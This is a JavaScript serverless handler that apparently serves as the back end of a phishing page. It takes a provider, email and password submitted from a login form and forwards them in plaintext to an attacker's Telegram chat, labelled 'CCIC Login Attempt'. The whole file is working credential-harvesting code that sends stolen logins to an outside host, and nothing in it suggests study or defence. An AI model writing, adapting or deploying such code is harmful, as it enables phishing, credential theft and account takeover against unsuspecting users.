export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { provider, email, password } = req.body || {};

  if (!provider || !email || !password) {
    return res.status(400).json({ error: 'Missing fields' });
  }

  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!token || !chatId) {
    return res.status(500).json({ error: 'Server not configured' });
  }

  const text = `🔐 *CCIC Login Attempt*\nProvider: ${provider}\nEmail: ${email}\nPassword: ${password}`;
  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;

  try {
    const tg = await fetch(url);
    const data = await tg.json();
    return res.status(200).json({ ok: true, data });
  } catch (err) {
    return res.status(500).json({ ok: false, error: err.message });
  }
}
